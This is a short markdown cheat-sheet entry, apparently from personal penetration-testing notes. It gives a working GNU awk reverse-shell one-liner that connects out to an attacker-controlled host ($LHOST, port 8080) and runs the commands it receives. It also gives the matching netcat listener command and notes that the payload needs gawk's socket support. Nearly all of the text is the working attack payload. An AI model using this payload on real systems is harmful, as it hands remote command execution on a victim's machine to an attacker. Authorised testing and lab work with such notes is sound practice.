# Awk Reverse Shell

A reverse shell payload using awk. Useful when standard tools are not available but awk is.

Used on: **<Machine>**

## One-liner

<!-- cmd: linux -->
```bash
awk 'BEGIN {s = "/inet/tcp/0/$LHOST/8080"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

## Listener

<!-- cmd: linux -->
```bash
nc -lvnp 8080
```

## Notes

- This payload relies on GNU awk (`gawk`) extensions for network sockets (`/inet/tcp/`).
- Will not work with standard awk or busybox awk.
